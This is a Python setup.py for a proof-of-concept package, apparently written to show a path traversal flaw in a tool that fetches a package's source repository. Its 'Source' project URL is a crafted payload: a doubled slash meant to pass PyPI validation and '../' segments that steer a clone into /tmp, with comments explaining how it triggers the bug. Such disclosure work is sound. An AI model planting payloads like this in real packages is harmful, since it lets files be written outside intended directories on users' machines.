from setuptools import setup

setup(
    name='opensrc-poc-traversal',
    version='1.0.5', # New version
    description='PoC for path traversal',
    project_urls={
        # The // trick makes PyPI happy (valid HTTPS) 
        # BUT it breaks the tool's restrictive regex, triggering the exploit!
        'Source': 'https://github.com//git@github.com:artahir-dev/../../../../../../tmp/opensrc-pwned.git'
    }
)